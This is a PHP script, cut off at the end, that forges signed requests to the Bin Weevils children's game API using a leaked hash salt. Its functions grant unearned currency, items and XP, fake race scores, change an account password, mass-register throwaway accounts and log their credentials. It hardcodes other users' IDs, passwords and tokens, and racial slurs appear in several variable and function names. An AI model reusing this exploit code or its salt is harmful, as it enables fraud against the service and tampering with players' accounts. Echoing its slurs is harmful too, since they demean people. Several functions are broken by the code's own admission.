<?php

/*

Add a page which has a form (username:password:idx) and the process script, gives the first 10 items
(using the freeitem api) to the player.



*/
 

	function o2_genhash($info) {
		$salt = "P07aJK8soogA815CxjkTcA==";
		return md5($salt.$info);
	}

	function md5hash($info) {
		return md5($info);
	}

	function timer_getandinc() {
		$timer = file_get_contents("timer.txt");
		$timer++;
		file_put_contents("timer.txt", $timer);
		return $timer;
	}

	function moneyexploitLOCID() {
		$locid = file_get_contents("locid.txt");
		$locid++;
		file_put_contents("locid.txt", $locid);
		return $locid;
	}

	function checkmulchandexp() {
		$curl = curl_init("http://lb.binweevils.com/nest/level-up");
		curl_setopt($curl, CURLOPT_TIMEOUT, '3');
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$OUTPUTYOUBLACKNIGER = trim(curl_exec($curl));
		curl_close($curl);
		print $OUTPUTYOUBLACKNIGER;
	}

	function mulchexploit() {
		$curl = curl_init("http://lb.binweevils.com/rewards/collect-dosh");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$locationid = moneyexploitLOCID();
		$total = 1100;
		$idx = file_get_contents("idx.txt");
		$hash = o2_genhash($locationid.$idx.$total.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&st=".$timer."&locID=".$locationid."&total=".$total."&idx=".$idx);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		#hash=c30e3880dfd95893b5dc3e3dc9649155&st=586031&locID=999999&total=1000&idx=213265581
		#$locid.$idx.$total.$st);
	}


	function doshitem() {
		$curl = curl_init("http://lb.binweevils.com/php2/shop/departmentStore/buyItem.php");
		curl_setopt($curl, CURLOPT_POST, true);
		#$timer = timer_getandinc();
		$timer = 1324883;
		$itemTypeID = "820";
		$storeName = "nestco";
		$colour = "0%2C0%2C0";
		$hash = "ce216c21ba4319cace5bcac1ea6e1703";
		$userIDX = "219995526";
		#$hash = o2_genhash($itemTypeID.$storeName.$colour.$userIDX.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "timer=".$timer."&userIDX=".$userIDX."&itemTypeID=".$itemTypeID."&hash".$hash."&storeName=".$storename."&colour=".$colour);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		#hash=c30e3880dfd95893b5dc3e3dc9649155&st=586031&locID=999999&total=1000&idx=213265581
		#$locid.$idx.$total.$st);
	}

	function freeitem($itemTypeId) {
			$curl = curl_init("http://lb.binweevils.com/nest/give-free-item");
			curl_setopt($curl, CURLOPT_POST, true);
			$st = timer_getandinc();
			$hash = o2_genhash($itemTypeId.$st);
			curl_setopt($curl, CURLOPT_POSTFIELDS, "itemTypeId=".$itemTypeId."&st=".$st."&hash=".$hash);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
			$outputnigga = trim(curl_exec($curl));
			curl_close($curl);
			print 'test1:'.$outputnigga;
			print '<h2>The free item was='.$itemTypeId.' !</h2>';
			return;
	}
	
	function garden($id) {
			$curl = curl_init("http://lb.binweevils.com/gardenshop/buy-item");
			curl_setopt($curl, CURLOPT_POST, true);
			$st = timer_getandinc();
			$colour = "4444FF";
			$hash = o2_genhash($id.$colour.$st);
			curl_setopt($curl, CURLOPT_POSTFIELDS, "colour=".$colour."&st=".$st."&id=".$id."&hash=".$hash);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
			$outputnigga2 = json_decode(curl_exec($curl), true);
			$outputnigga = trim(curl_exec($curl));
			curl_close($curl);
			print 'test1:'.$outputnigga;
			print '<h2>The item completed was='.$id.' !</h2>';
			return;
}
	
	function freeseeds($seedList) {
		$curl = curl_init("http://lb.binweevils.com/rewards/collect-seeds");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = timer_getandinc();
		$idx = file_get_contents("idx.txt");
		$hash = o2_genhash($idx.$seedList.$st);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "idx=".$idx."&st=".$st."&seedList=".$seedList."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	}
	
	function changepassword() {
		$curl = curl_init("http://lb.binweevils.com/php2/login/passwordChange.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$idx = 216253239;
		$password = 'test123';
		$hash = o2_genhash($idx.$password.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "idx=".$idx."&password=".$password."&timer=".$timer."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	}
	
	function l0gin() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/login/login.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$idx = 209815359; #login required, and idx
		$key = "7b04e";
		$hash = o2_genhash($idx.$key.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "idx=".$idx."&key=".$key."&timer=".$timer."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	}
	
		function l0gin2() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/login/logUserIn.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$userID = 'phosphorus';
		$password = 'lol1';
		$submitted = 1;
		$x = 36;
		$y = 38;
		$hash = o2_genhash($x.$y.$userID.$password);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "userID=".$userID."&password=".$password."&submitted=".$submitted."&x=".$x."&y=".$y);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	}


	function passwordReminder() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/apps/tinksblocks/passwordReminder.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$name = "-Jjs"; #name,timer,hash
		$hash = o2_genhash($name.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "name=".$name."&timer=".$timer."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		print ("name is =".$name);
		print ("timer is =".$timer);
		print ("hash is =".$hash);
	}
	
	
		function tinkregister() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/apps/tinksblocks/submitScore.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$name = "Ikpercy";
		$password ="ronaldo123";
		$level = 11;
		$score = 9999;
		$mode = 1;
		$hash = o2_genhash($name.$password.$level.$score.$mode.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "name=".$name."&password=".$password."&level=11&score=9999&hash=".$hash."&timer=".$timer);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	
	}

		function weevilstats() {##gives info
		$curl = curl_init("http://lb.binweevils.com/nest/get-weevil-stats?rndVar=0.5339983552694321");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = timer_getandinc();
		$idx = 216253239;
		$key = 0;
		$hash = o2_genhash($idx.$key.$st);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "idx=".$idx."&key=".$key."&st=".$st."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	}

		function startrace() {##gives info
		$curl = curl_init("http://lb.binweevils.com/game/start-race?rndVar=0.11045573698356748");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$trackId = 3;
		$hash = o2_genhash($trackId.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&timer=".$timer."&trackId=".$trackId);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	}
	

		function submitrace($key) {##gives info
		$curl = curl_init("http://lb.binweevils.com/game/submit-race?rndVar=0.05714996485039592");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = timer_getandinc();
		$numBeaten = 3;
		$hash = o2_genhash($key.$numBeaten.$st);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "st=".$st."&numBeaten=3&key=".$key."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	}
	
	    function magsav3() {##
	    $xml = "%3Cissue%3E%3CcoverImage%20id%3D%220%22%3E%3C%2FcoverImage%3E%3Ccover%3E%3C%2Fcover%3E%3Cpage%20template%3D%22rowpictextrowtextpic%22%3E%3Ctxt%3E%3C%21%5BCDATA%5B%3CP%20ALIGN%3D%22LEFT%22%3E%3CFONT%20FACE%3D%22Andy%22%20SIZE%3D%2220%22%20COLOR%3D%22%23000000%22%20LETTERSPACING%3D%220%22%20KERNING%3D%220%22%3ETest%20%3A%29%3C%2FFONT%3E%3C%2FP%3E%5D%5D%3E%3C%2Ftxt%3E%3Ctxt%3E%3C%21%5BCDATA%5B%5D%5D%3E%3C%2Ftxt%3E%3Cimg%20id%3D%220%22%3E%3C%2Fimg%3E%3Cimg%20id%3D%220%22%3E%3C%2Fimg%3E%3C%2Fpage%3E%3Cpage%20template%3D%22rowpictextrowtextpic%22%3E%3Ctxt%3E%3C%21%5BCDATA%5B%5D%5D%3E%3C%2Ftxt%3E%3Ctxt%3E%3C%21%5BCDATA%5B%5D%5D%3E%3C%2Ftxt%3E%3Cimg%20id%3D%220%22%3E%3C%2Fimg%3E%3Cimg%20id%3D%220%22%3E%3C%2Fimg%3E%3C%2Fpage%3E%3C%2Fissue%3E";
	    $uid = 960047; // cba btw on fiddler when you click save on mags you can copy this xml file and get it to save without needing to do something complex :P 
	    
	}
	
	function item2($itemID) {
		$curl = curl_init("http://lb.binweevils.com/php2/nest/multiRewardItem.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$hash = o2_genhash($itemID.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "itemID=".$itemID."&timer=".$timer."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	}
	
	
	
	function getItem($itemId) {
		$curl = curl_init("http://lb.binweevils.com/php2/shop/bundles/getItem.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$hash = o2_genhash($itemId.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "timer=".$timer."&itemId=".$itemId."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		#hash=c30e3880dfd95893b5dc3e3dc9649155&st=586031&locID=999999&total=1000&idx=213265581
		#$locid.$idx.$total.$st);
	}
	
	
	
	function makevalidsession() {
		$userpass = explode(":", file_get_contents("lastaccinfo.txt"));
		if(!login($userpass[0], $userpass[1])) {
			$newpass = "legend123";
			do {
				$newuser = rand_string(3, 10);
			} while(!checkuser($newuser));
			if(!register($newuser, $newpass))
				return false;
			else {
				file_put_contents("lastaccinfo.txt", $newuser.":".$newpass);
				file_put_contents("allaccounts.txt", "[".strftime("%a %m/%d/%Y %I:%M:%S %p")."] - ".$newuser.":".$newpass."\n", FILE_APPEND);
				return true;
			}
		}
		return true;
	}


	function login($user, $pass) {
		$curl = curl_init("http://lb.binweevils.com/php2/login/logUserIn.php");
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "userID=".$user."&password=".$pass."&rememberMe=1&submitted=1&x=".mt_rand(1, 200)."&y=".mt_rand(1, 100));
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_HEADER, true);
		curl_setopt($curl, CURLOPT_COOKIEJAR, "sitecookies.txt");
		$header = curl_exec($curl);
		curl_close($curl);

		print($header);

		if(preg_match('/http:\/\/play\.binweevils.com\?res\=(.*?)\n/', $header))
			return false;
		return true;
	}

	function rand_string($min, $max) {
		$length = mt_rand($min, $max);
		$chars = "abcdefghijklmnopqrstuvwxyz0123456789";    
		$size = strlen($chars);
		for($i = 0; $i < $length; $i++) {
			$str .= $chars[mt_rand(0, $size - 1)];
		}
		return $str;
	}

	function checkuser($user) {
		$curl = curl_init("http://lb.binweevils.com/php2/registration/checkName.php");
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "username=".$user);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		parse_str(curl_exec($curl), $result);
		curl_close($curl);
		
		if($result['responseCode'] == 1)
			return true;
		return false;
	}

	function register($user, $pass) {
		$curl = curl_init("http://lb.binweevils.com/php2/registration/registrationAds.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$hash = o2_genhash($pass.$timer.$user."113109656010111701");
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&timer=".$timer."&password=".$pass."&username=".$user."&weevilDef=113109656010111701&ref=");
		curl_setopt($curl, CURLOPT_COOKIEJAR, "sitecookies.txt");
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		parse_str(curl_exec($curl), $result);
		curl_close($curl);
		
		if($result['responseCode'] == 1)
		    print $user;
			print $pass;
			return true;
		return false;
	}


	function getweevilinfo($weevil) {
		$curl = curl_init("http://lb.binweevils.com/php2/weevil/getData.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$hash = o2_genhash($weevil.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&id=".$weevil."&timer=".$timer);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$weevildata = json_decode(curl_exec($curl), true);
		curl_close($curl);

		return $weevildata;
	}



##########################XP EXPLOIT###########################
	function xpexploit() {
		$curl = curl_init("http://lb.binweevils.com/php2/nest/partyRoomDwell.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$step = 3; #always 3 gives the most xp. 
		$visitorIdx = 218532618; #ur idx, u gotta change lastaccinfo aswell
		$tycoonIdx = 524799; #i think it can be random
		$hash = o2_genhash($step.$timer.$tycoonIdx.$visitorIdx);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "tycoonIdx=".$tycoonIdx."&step=".$step."&visitorIdx=".$visitorIdx."&hash=".$hash."&timer=".$timer);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	}
	
	
	##########################change pass###########################mysql error, checked later on
	function addeventpost() {
		$curl = curl_init("http://lb.binweevils.com/php2/social/addEventPost.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$eventPostType = 200;
		$idx1 = 219344858;
		$value = 1;
		$hash = o2_genhash($eventPostType.$idx1.$timer.$value);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "eventPostType=".$eventPostType."&idx1=".$idx1."&value=".$value."&timer=".$timer."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		print $hash;
	}
	
		function multirewarditem() {
		$curl = curl_init("http://lb.binweevils.com/php2/nest/multiRewardItem.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$itemID = "54949491";
		$hash = o2_genhash($itemID.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "itemID=".$itemID."&timer=".$timer."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		print $hash;#Multi Reward Items give a different reward each day when clicked on. They have multiple itemTypeIDs in the database, and the itemTypeID of existing items is changed in the database when the item gives a reward. The rewards are hard-coded in the php file. The delay is only 60 seconds on beaker for testing purposes.
	}
	
	
	
		function addPicture() {
		$curl = curl_init("http://lb.binweevils.com/php2/cameraPics/addPic.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$userIDX = "220921395";
		$size = 3;
		$picHash = md5hash(file_get_contents("picHash.txt")); 
		$hash = o2_genhash($userIDX.$size.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "userIDX=".$userIDX."&size=".$size."&timer=".$timer."&picHash=".$picHash."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl); // made my own version already scroll down its better.
		print $outputnigga;
		print ("</br>the hash is ".$hash."9a8a02323fef63b7518d790baeba73c42778b50aa27bcd822e5542cbe284da31");
		print ("</br>the pic has is ".$picHash."e007ac6d104e3a504a4140ff3be3516ce007ac6d104e3a504a4140ff3be3516c");
	}	
	
	
	
		function bingsnigger() {
		$curl = curl_init("http://lb.binweevils.com/php2/rewards/bingsGrotto.php");
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "");
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
	}	
	
	
	##############changedef
	
		function changeDef() {
		$curl = curl_init("http://lb.binweevils.com/weevil/change-definition?rndVar=0.31945370649918914");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$locationid = moneyexploitLOCID();
		$weevilDef = file_get_contents("idx.txt"); // best macdonalds look 120314612006142700 // B LACKEST 357373373305777700
		$hash = o2_genhash($weevilDef.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&weevilDef=".$weevilDef."&st=".$timer);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		#hash=c30e3880dfd95893b5dc3e3dc9649155&st=586031&locID=999999&total=1000&idx=213265581
		#$locid.$idx.$total.$st);
		}
		
		function def() {
		$curl = curl_init("http://lb.binweevils.com/weevil/change-definition?rndVar=0.31945370649918914");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$locationid = moneyexploitLOCID();
		$weevilDef = 120314612006142700; // best macdonalds look 120314612006142700 // B LACKEST 270270270270270270 // 270370270179177270 //357373373305777700 blackest ever
		$hash = o2_genhash($weevilDef.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&weevilDef=".$weevilDef."&st=".$timer);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		#hash=c30e3880dfd95893b5dc3e3dc9649155&st=586031&locID=999999&total=1000&idx=213265581
		#$locid.$idx.$total.$st);
		}

		function findDef() {
		$curl = curl_init("http://lb.binweevils.com/php/getWeevilDefinition.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$hash = o2_genhash($weevil.$timer);
		$userID = "DragonElemental";
		curl_setopt($curl, CURLOPT_POSTFIELDS, "userID=".$userID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
	
		function getneststate() {##gives info
		$curl = curl_init("http://lb.binweevils.com/nest/get-nest-state");
		curl_setopt($curl, CURLOPT_POST, true);
		$id = "bandit";
		$hash = o2_genhash($id);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "id=".$id);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works but requires user-pass
		}
			
		
		function getFreebie($freebie) {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/binBots/giveFreeMysteryBinBot.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = timer_getandinc();
		$hash = o2_genhash($st.$id);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "st=".$st."&id=".$id);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print 'test1:'.$outputnigga;
		print '<h2>The free item was='.$id.' !</h2>'; #doesnt really work due to api.
		print $outputnigga;
		}
		
		
		function XPhack() {
		$curl = curl_init("http://lb.binweevils.com/nest/rate-nest-room");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$rating = 5; #always 5 gives the most exp
		$locID = file_get_contents("idx.txt"); #you can get the locID from instanceID nestconfig.
		$hash = o2_genhash($rating.$locID); // the gen you have to use user-pass and enter locid as someone has to be online to rate ur nest
		curl_setopt($curl, CURLOPT_POSTFIELDS, "rating=".$rating."&locID=".$locID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		function XPhack2() {
		$curl = curl_init("http://lb.binweevils.com/nest/rate-nest-room");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$rating = 5; #always 5 gives the most exp
		$locID = 309065406; #you can get the locID from instanceID nestconfig.
		$hash = o2_genhash($rating.$locID); // the gen you have to use user-pass and enter locid as someone has to be online to rate ur nest
		curl_setopt($curl, CURLOPT_POSTFIELDS, "rating=".$rating."&locID=".$locID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga;
		}
		
		function leaderboards() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/leaderboards/weevilWheels.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$trackNumber = 3;
		$idx = 216253239; #lets you view the track leaderboard you need to change lastaccinfo.txt
		$hash = o2_genhash($id);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "idx=".$idx."&trackNumber=".$trackNumber);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works but only can view the leaderboards.
		}
		
		
		function submitTrackTime() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/weevilWheels/submitTrackTime.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = timer_getandinc();
		$lap1 = 0;
		$lap2 = 0; // fixed a new version as this didnt work.
		$lap3 = 0;
		$timer = timer_getandinc();
		$trackID= 434;
		$hash = o2_genhash($st.$timer.$lap1.$lap2.$lap3.$trackID.$hash);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "st=".$st."&timer=".$timer."&lap1=".$lap1."&lap2=".$lap2."&lap3=".$lap3."&trackID=".$trackID."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works i know, but look at it later.
		}
		
		
		function doshGen() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/videoAds/finishPlayingVideo.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = 216253239;
		$token = "13ce3278d0760fd59b779587a7405d8d"; #you have to get the giveMeVideoToSee get the token and swap with finishPlayingVideo Token
		$videoId = 55;
		$hash = o2_genhash($videoId.$token.$idx.$hash);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "videoId=".$videoId."&token=".$token."&idx=".$idx."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works i know, but look at it later.
		}
		
		
		function videoAds() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/videoAds/giveMeVideoToSee.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = 216253239;
		$hash = o2_genhash($token.$idx.$hash);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "idx=".$idx."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works i know, but look at it later.
		}
		
		
		function startPlayingVideo() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/videoAds/startPlayingVideo.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$idx = 216253239;
		$token = "13ce3278d0760fd59b779587a7405d8d";
		$videoId = 55;
		$hash = o2_genhash($videoId.$token.$idx.$hash);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "videoId=".$videoId."&token=".$token."&idx=".$idx."&hash=".$hash);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print $outputnigga; #works i know, but look at it later.
		}
		
		
	    function harvestplant($id) {
		$curl = curl_init("http://lb.binweevils.com/garden/harvest-plant");
		curl_setopt($curl, CURLOPT_POST, true);
		$st = timer_getandinc();
		$plantID = 295643211;
		$hash = o2_genhash($st.$hash.$plantID);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&st=".$st."&plantID=".$plantID);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print 'test1:'.$outputnigga;
		print '<h2>The plant harvested was='.$plantID.' !</h2>'; // works
		return;
		}
		
		
		function nestfuel() {##gives info
		$curl = curl_init("http://lb.binweevils.com/nest/buy-nest-fuel?rndVar=0.9075376112014055");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$cost = 10000;
		$hash = o2_genhash($cost.$hash.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&timer".$timer."&cost=".$cost);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
	
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print 'test1:'.$outputnigga;
		print '<h2>The free item was='.$trackID.' !</h2>'; #doesnt really work due to api.
		print $outputnigga;
		}
		
		
		function getmessage() {##gives info
		$curl = curl_init("http://lb.binweevils.com/php2/loginMessages/getMessage.php");
		curl_setopt($curl, CURLOPT_POST, true);
		$timer = timer_getandinc();
		$hash = o2_genhash($messageId.$hash.$timer);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "hash=".$hash."&timer".$timer."&messageId=".$messageId);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_COOKIEFILE, "sitecookies.txt");
		$outputnigga = trim(curl_exec($curl));
		curl_close($curl);
		print 'test1:'.$outputnigga;
